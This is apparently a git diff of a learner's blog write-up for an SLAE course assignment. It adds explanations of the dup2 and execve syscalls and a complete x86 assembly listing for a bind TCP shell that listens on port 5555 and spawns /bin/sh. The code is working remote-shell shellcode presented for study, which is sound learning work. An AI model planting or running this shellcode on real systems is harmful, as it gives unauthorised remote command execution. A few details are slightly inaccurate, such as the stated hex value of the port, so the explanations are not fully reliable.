@@ -17,7 +17,7 @@ tags:
 
 The first SLAE assignment is to develop shellcode for a bind TCP shell. What is a bind TCP shell? According to [Infosec Institute](https://resources.infosecinstitute.com/icmp-reverse-shell/#gref), a bind shell is "a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server."
 
-I found that while not an easy subject, the actual assembly code construction was not very difficult. The learning curve from this assignment really came from trying to wrap my head around 'socket programming' fundamentals. The hardest part for me was trying to parse man page information about the various syscalls and trying to understand how to format the arguments required for each syscall. Let's jump right into it. 
+I found that while not an easy subject, the actual assembly code construction was not very difficult. The learning curve from this assignment really came from trying to wrap my head around 'socket programming' fundamentals. The hardest part for me was trying to parse man page information about the various syscalls and trying to understand how to format the arguments required for each syscall. ***I am not a professional programmer, I apologize for any socket programming concepts I butchered in my explanations***
 
 ## Prototype
 
@@ -157,7 +157,7 @@ Now, let's start creating our sockaddr struct on the stack. A [sockets programmi
 
 Let's start moving these values into the registers. Our port number will be 5555 and our internet address will be 0.0.0.0
 
-Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of 0x1563, we will place 0xb315 onto the stack.
+Because the stack grows from High to Low, we will have to place these arguments onto the stack in reverse order. We will also have to put our port number in Little Endian format, so instead of `0x1563`, we will place `0xb315` onto the stack.
 
 ```nasm
     push 0
@@ -222,6 +222,165 @@ If you read the accept4 man page carefully, the RETURN VALUE section states that
 ```
 
 ## Dup2 Syscall 
+
+If we reference our C prototype, we see that the dup2 call is iterating 3 times in order to duplicate into our accepted connection the STDIN (0), STDOUT (1), and STDERR (2) file descriptors which makes the connection interactive for the user. `cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2` gives a syscall code of 63 (`0x3f`). 
+
+Since we're iterating through this call 3 times, we'll need to set up a loop. We can utilize ECX for this as it's known as the 'counter register.' We'll place a value of 3 into the lower part of ECX and have our loop iterate as long as the zero flag is not set with a `jnz` op code. So as long as the zero flag is not set, which is to say that ECX hasn't been decremented to zero, our code will jump back up to the beginning of the loop and execute it again. 
+
+All that dup2 requires for an argument is the `int sockfd` which was newly created in our accept syscall and stored in EDI. 
+
+```nasm
+    mov cl, 0x3     ; putting 3 in the counter
+    loop_dup2:      
+    xor eax, eax   
+    mov al, 0x3f    ; putting the syscall code into the lower part of eax
+    mov ebx, edi    ; putting our new int sockfd into ebx
+    dec cl          ; decrementing cl by one
+    int 0x80
+    
+    jnz loop_dup2   ; jumping back to the top of loop_dup2 if the zero flag is not set
+```
+
+## Execve Syscall
+
+Finally, we need to tell the program what to do once everything we've done so far is complete. In our case, we want the program to execute `/bin/sh`. 
+
+`cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve` gives us 11 (`0x0b`). 
+
+Let's clear out EAX
+
+```nasm
+    xor eax, eax
+```
+
+We will be utilizng the stack for these arguments. So we will be doing things in slightly a different order than our previous syscalls. This particular syscall requires null terminators and pointers to stack locations. Remember the stack grows from High to Low so first we need to put a terminator onto the stack.
+
+```nasm
+    push eax
+```
+
+Next, we need to place the string `/bin/sh` onto the stack in reverse order. However, before we do this and in order to avoid NULL BYTEs in our shellcode, we need to make sure that the string is divisable by 4. Right now, it's 7 characters so we add an additional character to make it an even 8. `//bin/sh`
+
+```nasm
+    push 0x68732f6e
+    push 0x69622f2f
+```
+
+Next, we need EBX to carry the pointer location of the entity we just created on the stack. 
+
+```nasm
+    mov ebx, esp
+```
+
+Next, we will need another zeroed out value to be pointed to for EDX, so let's push EAX onto the stack once more and then assign the ESP to EDX.
+
+```nasm
+    push eax
+    mov edx, esp
+```
+
+Finally, ECX should point to the location of EBX. So we'll push EBX onto the stack and then move ESP into ECX. 
+
+```nasm 
+    push ebx
+    mov ecx, esp
+```
+
+Now we can put our `0x0b` into the lower portion of EAX and call our interrupt. 
+
+```nasm
+    mov al, 0x0b
+    int 0x80
+```
+
+## Completed Assembly Code 
+
+```nasm
+global_start
+
+section .text
+_start: 
+	
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
+	
+	; SYS CALL #1 = socket()
+	
+	mov ax, 0x167
+	mov bl, 0x02
+	mov cl, 0x01
+	
+	int 0x80
+	mov edi, eax
+
+	; SYS CALL #2 = bind()
+	
+	xor eax, eax
+	mov ax, 0x169
+	mov ebx, edi 
+	push 0
+	push 0
+  push word 0xb315
+	push word 0x02
+
+	mov ecx, esp
+	mov dl, 16 
+	
+	int 0x80
+
+	; SYSCALL #3= listen()
+
+  xor eax, eax
+	mov ax, 0x16b
+	mov ebx, edi
+	xor ecx, ecx
+	
+	int 0x80
+
+	; SYSCALL #4 = accept4()
+	
+	xor eax, eax
+	mov ax, 0x16c
+	mov ebx, edi
+	xor ecx, ecx
+	xor edx, edx
+	xor esi, esi
+  
+	int 0x80
+
+	xor edi, edi
+	mov edi, eax
+
+	; SYSCALL #5 = dup2()
+	
+  mov cl, 0x3
+	
+	loop_dup2:
+	xor eax, eax ; clearing out eax
+	mov al, 0x3f ; setting the value to the syscall code
+	mov ebx, edi ; putting our new_fd we got from our accept return code
+	dec cl       ; decrementing the counter register by 1
+	int 0x80     ; interrupt call
+
+	jnz loop_dup2 ; if the counter register hasn't hit zero and set the zero flag, it will jump back to the top of our loop
+
+	; SYSCALL #6 = execve()
+ 
+  xor eax, eax
+	push eax
+	push 0x68732f6e
+	push 0x69622f2f
+	mov ebx, esp
+	push eax
+	mov edx, esp
+	push ebx
+	mov ecx, esp
+	mov al, 0x0b
+
+  int 0x80
+```
 
 ## Resources
 
